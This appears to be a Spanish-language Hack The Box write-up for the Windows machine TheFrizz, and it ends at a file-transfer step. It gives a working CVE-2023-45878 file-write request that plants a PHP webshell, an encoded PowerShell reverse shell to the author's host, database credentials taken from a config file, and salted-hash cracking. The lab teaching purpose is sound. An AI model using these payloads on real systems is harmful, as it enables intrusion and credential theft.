---
title: TheFrizz - Medium (HTB)
permalink: /TheFrizz-HTB-Writeup/
tags:
  - "Windows"
  - "Medium"
  - "CVE-2023-45878"
  - "RCE"
  - "Arbitrary File Write"
  - "GibbonEdu"
  - "MySQL"
  - "XAMPP"
  - "Credentials Leakage"
  - "Kerberos"
  - "Hash Cracking"
  - "GPO Abuse"
  - "SharpGPOAbuse"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: TheFrizz - Medium (HTB)
seo_description: Explota CVE-2023-45878, descifra contraseñas y abusa de permisos sobre GPO en un dominio de Active Directory para vencer TheFrizz.
excerpt: Explota CVE-2023-45878, descifra contraseñas y abusa de permisos sobre GPO en un dominio de Active Directory para vencer TheFrizz.
header:
  overlay_image: /assets/images/headers/thefrizz-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/thefrizz-hackthebox.jpg
---


![image-center](/assets/images/posts/thefrizz-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2023-45878 -  Unauthenticated Arbitrary File Write in `Gibbon LMS 25.0.1`, MySQL Database Enumeration, Hash Cracking  - `SHA256($salt.$pass)`, Kerberos Client Setup, Credentials Leakage, Abusing GPOs (Group Policy Objects) - `SharpGPOAbuse.exe`
{: .notice--primary}

# Introducción

TheFrizz es una máquina Windows de dificultad `Medium` en HackTheBox. En este escenario debemos comprometer un dominio de Active Directory, ganando acceso inicial explotando CVE-2023-45878 en el servicio Gibbon, obteniendo credenciales a través del descifrado de `SHA256` en un formato personalizado. Permisos a nivel de GPOs (Group Policy Objects) nos permitirán obtener acceso privilegiado y vencer TheFrizz.
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.60 
PING 10.10.11.60 (10.10.11.60) 56(84) bytes of data.
64 bytes from 10.10.11.60: icmp_seq=1 ttl=127 time=166 ms

--- 10.10.11.60 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 166.112/166.112/166.112/0.000 ms
~~~


## Nmap Scanning 

Lanzaremos un escaneo que únicamente descubra puertos abiertos en la máquina víctima, por ahora usaremos el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.60 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 21:57 EDT
Nmap scan report for 10.10.11.60
Host is up (0.31s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
62384/tcp open  unknown
62388/tcp open  unknown
62397/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 67.02 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo con el propósito de identificar los servicios que se ejecutan además de su versión 

~~~ bash
nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49664,49668,49670,62384,62388,62397 -sVC 10.10.11.60 -oN services
    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-19 22:00 EDT
Nmap scan report for 10.10.11.60
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-20 09:00:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62384/tcp open  msrpc         Microsoft Windows RPC
62388/tcp open  msrpc         Microsoft Windows RPC
62397/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-20T09:01:12
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.55 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Dada la gran cantidad de servicios, notaremos que estamos frente a un **Controlador de Dominio** de Active Directory. Vemos tanto el nombre del DC como el nombre del dominio, agregaremos estos a nuestro archivo `/etc/hosts` para poder aplicar la resolución DNS correctamente

~~~ bash
cat /etc/hosts | grep frizz.htb     

10.10.11.60 frizzdc.frizz.htb frizz.htb
~~~


## (Posible) RPC & SMB Enumeration

Siempre que nos encontremos en un entorno de Active Directory, debemos validar sesiones anónimas en servicios como `smb` o `rpc`, rápidamente podemos hacerlo con los siguientes comandos

~~~ bash
smbclient -L 10.10.11.60 -U "" -N
session setup failed: NT_STATUS_NOT_SUPPORTED

rpcclient 10.10.11.60 -U "" -N                               
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
~~~

En ambos casos no tenemos éxito, entonces sabremos que el DC no admite sesiones anónimas, seguiremos enumerando otros servicios. Sin embargo, el error que vemos es debido a que el DC admite solamente autenticación `kerberos`, y NTLM se encuentra deshabilitado


## Web Analysis

Si navegamos hasta `frizzdc.frizz.htb`, veremos la siguiente web que parece ser de una escuela

![image-center](/assets/images/posts/thefrizz-web-analysis.png)
{: .align-center}

Vemos un botón `Staff Login` que nos redirige a una web de inicio de sesión bajo la ruta `http://frizzdc.frizz.htb/Gibbon-LMS`

![image-center](/assets/images/posts/thefrizz-web-analysis-2.png)
{: .align-center}

Podemos ver la versión de Gibbon dentro del `footer`, corresponde a la `25.0.0`

![image-center](/assets/images/posts/thefrizz-web-analysis-3.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## CVE-2023-45878 -  Unauthenticated Arbitrary File Write in `Gibbon LMS 25.0.1`

GibbonEdu es una plataforma educativa de código abierto diseñado para administrar procesos académicos y administrativos, está orientado a escuelas e instituciones 

Las versiones anteriores a la `25.0.1` de Gibbon permiten la escritura de archivos y una posterior ejecución de código malicioso porque `rubrics_visualise_saveAjax.phps` no requiere autenticación. Para obtener RCE, un atacante debe subir una imagen falsa que se almacene como un archivo PHP. 

### Understanding Vulnerability

Viendo el código fuente disponible en [`Github`](https://github.com/GibbonEdu/core/blob/v25.0.01/modules/Rubrics/rubrics_visualise_saveAjax.php), vemos que el endpoint vulnerable acepta los parámetros `img`, `path`, y `gibbonPersonID` a través de una solicitud POST. 

~~~ php
[...]
$img = $_POST['img'] ?? null;
$imgPath = $_POST['path'] ?? null;
$gibbonPersonID = !empty($_POST['gibbonPersonID']) ? str_pad($_POST['gibbonPersonID'], 10, '0', STR_PAD_LEFT) : null;
$absolutePath = $gibbon->session->get('absolutePath');
~~~

El servidor espera el contenido de la imagen codificado`base64`, sucedido del formato y el nombre de la imagen (por ejemplo, `type/png;nombre,BASE64`)

~~~ php
// Decode raw image data
list($type, $img) = explode(';', $img);
list(, $img)      = explode(',', $img);
$img = base64_decode($img);
~~~

Si se establece el parámetro `path`, esta ruta se utiliza como directorio de destino, concatenada con la ruta del directorio de Gibbon, y el valor de `img` se escribe ahí

~~~ php
// Write image data
$fp = fopen($absolutePath.'/'.$imgPath, 'w');
fwrite($fp, $img);
fclose($fp);
~~~

### Proof of Concept

La siguiente solicitud HTTP envía una imagen maliciosa al endpoint vulnerable, el payload más una explicación técnica la podremos encontrar en el siguiente [artículo](https://herolab.usd.de/security-advisories/usd-2023-0025/)

~~~ http
POST /modules/Rubrics/rubrics_visualise_saveAjax.php HTTP/1.1
...
...
...
Content-Type: application/x-www-form-urlencoded

img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001
~~~

El valor de `img` realmente es una `webshell` típica en PHP, además de estar codificada en `base64` tal como espera el servidor. Sin embargo, se añade `+` codificado en URL (`%2b`).

> Posiblemente se intente utilizar `+` sin cerrar el código PHP como una técnica de evasión de algún filtro para conseguir ejecutar el código, ya que es posible ejecutar código PHP sin la etiqueta de cierre (`?>`). 
{: .notice--warning}

Esta técnica  no es estrictamente necesaria, porque podemos perfectamente cerrar el código PHP con `?>`, y el archivo funciona correctamente 

~~~ php
<?php echo system($_GET['cmd'])?
~~~

### Exploiting

Habiendo entendido la lógica de explotación, emitiremos una solicitud HTTP maliciosa, en mi caso utilicé el siguiente payload en `base64`

~~~ bash
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKT8%2bCg

# Payload decodificado
<?php echo system($_GET["cmd"])?>
~~~

- La cadena contiene caracteres como `+`, debemos codificarlos en URL (`%2b`)

Al enviar la solicitud desde `Burpsuite`, veremos cómo se ejecuta correctamente, aunque debemos validar que podamos ejecutar comandos a través del nuevo archivo, en mi caso lo llamé `test.php`

![image-center](/assets/images/posts/thefrizz-cve.png)
{: .align-center}

Ahora deberíamos poder ver nuestro archivo `test.php` en la ruta donde se encuentra Gibbon, usaremos el parámetro `cmd` en la URL para validar ejecución de comandos

![image-center](/assets/images/posts/thefrizz-rce.png)
{: .align-center}

El output nos da una pista de que se está ejecutando sobre Windows por el uso de `\` para indicar el nombre del usuario, propio de Windows


## Shell as `w.service`

Ejecutaremos un comando de `powershell` que nos envíe una consola a nuestra máquina por un puerto determinado. Primeramente, iniciaremos un listener para recibir dicha conexión

~~~ bash
rlwrap -cAr nc -lvnp 443   
listening on [any] 443 ...
~~~

Desde `revshells.com` podemos rápidamente buscar un comando de `powershell` que nos envíe una reverse shell, en mi caso he utilizado un comando en `base64`, junto con codificación URL 

~~~ http
GET /Gibbon-LMS/test.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMwAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA%2BACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA%2BACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA%3D
~~~

Enviaremos el comando (ajustado a tu IP y puerto) a través del parámetro `cmd` ya sea desde `Burpsuite` o desde el navegador

![image-center](/assets/images/posts/thefrizz-rce-2.png)
{: .align-center}

Al momento de ejecutar el comando en el servidor, desde nuestro listener recibiremos una nueva conexión desde la máquina víctima

~~~ bash
rlwrap -cAr nc -lvnp 443   
listening on [any] 443 ...
connect to [10.10.15.30] from (UNKNOWN) [10.10.11.60] 55381

PS C:\xampp\htdocs\Gibbon-LMS> whoami
frizz\w.webservice
~~~


## Finding Lateral Movement Path

Estamos dentro del entorno de Active Directory, ahora debemos buscar una forma de escalar nuestros privilegios. Aún no conocemos ni los usuarios ni la estructura del dominio, pero disponemos de una consola de `powershell` para enumerar ya sea archivos, usuarios, etc. 

Antes de lanzar un `injestor` para recolectar información del dominio y subirla a BloodHound, podemos buscar archivos que puedan contener información interesante

### Database Credentials

Dentro del directorio actual, encontraremos un archivo `config.php`

~~~ bash
PS C:\xampp\htdocs\Gibbon-LMS> dir

    Directory: C:\xampp\htdocs\Gibbon-LMS
    
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
...
...
...
-a----         1/20/2023   6:04 AM         103023 CHANGELOG.txt
-a----         1/20/2023   6:04 AM           2972 composer.json
-a----         1/20/2023   6:04 AM         294353 composer.lock
-a----        10/11/2024   8:15 PM           1307 config.php
...
...
...
~~~

Si inspeccionamos su contenido con el comando `type`, veremos que contiene credenciales para conectarse a una base de datos, aunque no se menciona a qué gestor


~~~ bash
PS C:\xampp\htdocs\Gibbon-LMS> type config.php
<?php
/*
Gibbon, Flexible & Open School System
Copyright (C) 2010, Ross Parker
...
...
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
...
...
~~~


## Database Enumeration - `mysql`

Por la facilidad para ejecutar servicios web que ejecuten PHP en Windows, el servicio Gibbon se ejecuta dentro de un entorno `XAMPP`

> XAMPP es un paquete de software gratuito, multiplataforma y de código abierto que incluye `Apache` (servidor web), `MariaDB` (base de datos), `PHP` y `Perl` (lenguajes de programación), usado para crear y probar sitios web en un ordenador local
{: .notice--info}

Como se menciona, `XAMPP` cuenta con `mysql`, el cual podremos encontrar en el directorio `C:\xampp\mysql`

~~~ powershell
PS C:\xampp\htdocs\Gibbon-LMS> dir ..\..\

    Directory: C:\xampp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        10/29/2024   7:25 AM                apache
d-----        10/29/2024   7:26 AM                cgi-bin
d-----        10/29/2024   7:25 AM                contrib
d-----        10/29/2024   7:28 AM                htdocs
d-----        10/29/2024   7:25 AM                licenses
d-----        10/29/2024   7:25 AM                mysql
d-----        10/29/2024   7:26 AM                php
d-----        10/29/2024   7:25 AM                src
d-----         8/23/2025   5:57 PM                tmp
~~~

Utilizaremos el ejecutable `mysql.exe` para conectarnos a la base de datos con las credenciales que obtuvimos del archivo de configuración

~~~ powershell
PS C:\xampp\htdocs\Gibbon-LMS> cd C:\xampp\mysql\bin
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'show tables'

Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
...
...
...
~~~

Veremos muchas tablas, aunque busquemos palabras como `users`, `passwords` o `session`, no encontraremos gran cosa. Dejaré el [artículo](https://ask.gibbonedu.org/t/passwords/673/3) donde el mismo fundador de `Gibbon` dice dónde se guarda la información de los usuarios

![image-center](/assets/images/posts/thefrizz-hash-cracking.png)
{: .align-center}

### Passwords (SHA1 + Salt)

Enumerando esta tabla, veremos muchas columnas, aunque podremos buscar rápidamente lo que nos interesa de la siguiente manera. La siguiente consulta muestra el nombre de las columnas que componen la contraseña

~~~ powershell
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonPerson' | findstr username
username	varchar(20)	NO	UNI	NULL

# Columnas para las contraseñas
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'describe gibbonPerson' | findstr password
passwordStrong	varchar(255)	NO		NULL	
passwordStrongSalt	varchar(255)	NO		NULL	
passwordForceReset	enum('N','Y')	NO		N
~~~

Según la siguiente [respuesta](https://ask.gibbonedu.org/t/password-hashing/885) del fundador en el foro de Gibbon, vemos que Gibbon almacena sus contraseñas en `SHA1` sumado a un `salt`

![image-center](/assets/images/posts/thefrizz-hash-algo.png)
{: .align-center}

Este mensaje fue escrito por el fundador, pero en `2016`, por lo que ahora el algoritmo ya no es `SHA1`, es `SHA256`

> En la versión `25.0.0` (de este contexto) de `Gibbon`, el algoritmo utilizado es `SHA256`, podemos comprobarlo desde el repositorio de [Github](https://github.com/GibbonEdu/core/blob/v25.0.00/preferencesPasswordProcess.php#L73)
{: .notice--danger}

Esta información es clave para entender cómo podemos desencriptar contraseñas, procederemos a extraer los hashes desde la base de datos

~~~ powershell
PS C:\xampp\mysql\bin> .\mysql.exe -uMrGibbonsDB -p'MisterGibbs!Parrot!?1' gibbon -e 'SELECT username,passwordStrong,passwordStrongSalt FROM gibbonPerson'
username	passwordStrong	passwordStrongSalt
f.frizzle	067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03	/aACFhikmNopqrRTVz2489
~~~

Vemos un hash en formato `SHA256` y un salt para el usuario `f.frizzle`, procederemos a buscar una forma para desencriptar esta contraseña


## Hash Cracking

Por el enlace anterior de [`Github`](https://github.com/GibbonEdu/core/blob/v25.0.01/preferencesPasswordProcess.php#L73) del código fuente, sabemos que la forma para descifrar la contraseña es cargando el `salt` y luego el `hash`

~~~ php
//Check current password
                if (hash('sha256', $user['passwordStrongSalt'].$password) != $user['passwordStrong']) {
                    header("Location: {$URL->withReturn('error3')}");
                } else {
~~~

> En criptografía, un salt es un conjunto de datos aleatorios que se añade a una contraseña (o frase de contraseña) antes de que se aplique una función de hashing.
{: .notice--info}

Esta información es **vital** para descifrar la contraseña que extrajimos desde la base de datos, de lo contrario nos dará la sensación de que es "incrackeable"

### `Hashcat`

Sabiendo de qué manera se procesa la contraseña, al intentar crackearlo con `hashcat` debemos buscar el modo que usaremos

~~~ bash
hashcat --example-hashes | grep 'sha256' -B 1 

Hash mode #1420
  Name................: sha256($salt.$pass)
~~~

El modo `1420` es el que debemos utilizar para que `hashcat` procese la contraseña y la descifre correctamente

> El formato de archivo en `hashcat` puede confundirnos, se espera que carguemos el archivo con el formato `$username$hash$salt`, no está relacionado con el modo que utiliza `hashcat` para descifrar.
{: .notice--danger}

Guardaremos la información en un archivo de la siguiente manera, de lo contrario, obtendremos el error `No hashes loaded.`

~~~ bash
f.frizzle:067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
~~~

El comando que utilizaremos contiene el modo `1420`, el cual es para `sha256($salt,$pass)`, además de la flag `--username`

~~~ bash
hashcat -a 0 -m 1420 hashcat.txt /usr/share/wordlists/rockyou.txt -O --username
....
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic230
...
~~~

### `JohnTheRipper` with Dynamic Format

En `john`, existe un formato especial que le permite entender contraseñas en un formato dinámico, donde se aplican funciones con ciertos algoritmos.

En el siguiente enlace a [`Github`](https://github.com/openwall/john/blob/bleeding-jumbo/doc/DYNAMIC#L178), veremos una tabla donde podemos buscar el formato que utilizaremos para romper esta contraseña, el formato que encaja perfectamente con este requerimiento es `dynamic_61`.

> El formato de `JohnTheRipper` puede confundir nuestra lógica, pero se espera que carguemos el archivo con el formato `$formato$hash$salt`, el cual no se relaciona con el formato que vamos a utilizar para crackear hashes.
{: .notice--danger}

Aclarando esta posible confusión, guardaremos el hash en un archivo de la siguiente manera

~~~ bash
$dynamic_61$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
~~~

Procederemos a intentar crackear la contraseña empleando la flag `--format=dynamic_61`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=dynamic_61

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (dynamic_61 [sha256($s.$p) 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Jenni_Luvs_Magic23 (?)     
1g 0:00:00:02 DONE (2025-08-23 15:27) 0.4761g/s 5248Kp/s 5248Kc/s 5248KC/s Jesus14jrj..Jeepers93
Use the "--show --format=dynamic_61" options to display all of the cracked passwords reliably
Session completed. 
~~~
<br>
De ambas formas logramos romper la contraseña, y aunque parezca redundante, nunca está demás aprender sobre varias opciones de herramientas para una misma tarea


## Shell as `f.frizzle`

Ahora disponemos de las siguientes credenciales: `f.frizzle`: `Jenni_Luvs_Magic23`, las validaremos frente al protocolo `kerberos` (obligatorio) con la flag `-k`

~~~ bash
ntpdate 10.10.11.60 && nxc smb FRIZZDC.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k

2025-08-23 23:54:29.63918 (-0400) +0.009938 +/- 0.099192 10.10.11.60 s1 no-leap
SMB         FRIZZDC.frizz.htb 445    FRIZZDC          [*]  x64 (name:FRIZZDC) (domain:frizz.htb) (signing:True) (SMBv1:False)
SMB         FRIZZDC.frizz.htb 445    FRIZZDC          [+] frizz.htb\f.frizzle:Jenni_Luvs_Magic23
~~~

Si consultamos rápidamente al usuario `f.frizzle`, podremos notar que este usuario forma parte del grupo `Remote Management Users`, esto en teoría nos permite conectarnos con una consola de `powershell`

~~~ powershell
PS C:\xampp\mysql\bin> net user f.frizzle  
User name                    f.frizzle
Full Name                    fiona frizzle
Comment                      Wizard in Training
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/23/2025 10:26:22 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
~~~ 

Sin embargo, el puerto `5985` no se encuentra abierto, por lo que en este caso el acceso será vía `SSH`

### Kerberos Client Setup

Para poder utilizar el protocolo `kerberos` a modo de autenticación, debemos especificar el KDC (Key Distribution Center), quien es el encargado de emitir los tickets `kerberos`.

En nuestra máquina podemos usar un archivo `.krb5.conf` con la configuración necesaria

~~~ bash
[libdefaults]
  default_realm = FRIZZ.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  FRIZZ.HTB = {
    kdc = frizzdc.frizz.htb
    admin_server = frizzdc.frizz.htb
  }
[domain_realm]
        frizz.htb = FRIZZ.HTB
        .frizz.htb = FRIZZ.HTB
~~~

Solicitaremos un TGT (`Ticket Granting Ticket`) para el usuario `f.frizzle`, el cual será necesario en el acceso remoto

~~~ bash
getTGT.py frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip FRIZZDC.frizz.htb             
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
~~~

> Es posible que la línea que describe el Controlador de Dominio en nuestro archivo `/etc/hosts` deba verse de la siguiente manera, especificamos el FQDN (`Fully Qualified Domain Name`) para poder autenticarnos correctamente vía `SSH`
{: .notice--warning}

~~~ bash
10.10.11.60 frizzdc.frizz.htb frizz.htb frizzdc
~~~

Una vez ya disponemos del TGT, lo cargaremos en la variable de entorno `KRB5CCNAME` y nos conectaremos por `SSH` con el parámetro `-K`

~~~ bash
KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@frizzdc.frizz.htb

PowerShell 7.4.5
PS C:\Users\f.frizzle> whoami
frizz\f.frizzle
~~~

Ya podremos ver la flag del usuario sin privilegios, la cual se ubica en la carpeta `Desktop`

~~~ powershell
PS C:\Users\f.frizzle> type Desktop\user.txt 
375048537c783045f90545f9ac74fcad
~~~
<br>


# Escalada de Privilegios
---
## System Enumeration

Nos podrá llevar bastante tiempo buscando formas de escalar privilegios, ya que BloodHound no mostrará información relevante.
<br>
Veremos una carpeta `$RECYCLE.BIN` en `C:\`, la cual corresponde a la papelera de reciclaje

> La carpeta `$Recycle.Bin` (o Papelera de reciclaje) es una carpeta predeterminada de Windows que almacena los archivos y carpetas **eliminados** temporalmente, permitiendo su recuperación antes de que se borren permanentemente.
{: .notice--info} 

~~~ bash
PS C:\> dir -force 

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:36 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:35 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
~~~

Dentro de la carpeta nombrada con el `SID` del usuario, veremos dos archivos `.7z`

~~~ powershell
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> dir -Force 

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
~~~

Si consultamos el contenido del primero, veremos una ruta el en sistema

~~~ bash
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> type '.\$IE2XMEG.7z'           
☻[ �☺▬�2*�☺<C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z
~~~

Si buscamos por `wapt` en Google, veremos que consiste en una herramienta desarrollada por `Tranquil IT`

> WAPT es una herramienta silenciosa de despliegue remoto de software y configuración para empresas y administraciones públicas.
{: .notice--info}

Es posible que este archivo sea una copia de seguridad de la herramienta `WAPT`. Si intentamos ver si este archivo existe, notaremos que no

~~~ powershell
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> dir C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z -Force

Get-ChildItem: Cannot find path 'C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z' because it does not exist.
~~~

El segundo archivo comprimido tiene mucho más tamaño, por lo que es posible que éste sea el archivo que intentamos buscar

### File Transfer

Para transferir el comprimido, utilizaremos el servicio web de Apache, el cual nos permitirá descargar rápidamente el contenido que alojemos allí.

Desde la consola de `ssh` como el usuario `f.frizzle`, copiaremos el recurso `$RE2XMEG.7z` a un directorio donde cualquier usuario tenga acceso, como `C:\Programdata`, además le daremos permisos completos a otros usuarios

~~~ bash
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> copy '.\$RE2XMEG.7z' C:\Programdata

PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> icacls 'C:\Programdata\$RE2XMEG.7z' /grant everyone:F
processed file: C:\Programdata\$RE2XMEG.7z
Successfully processed 1 files; Failed processing 0 files
~~~

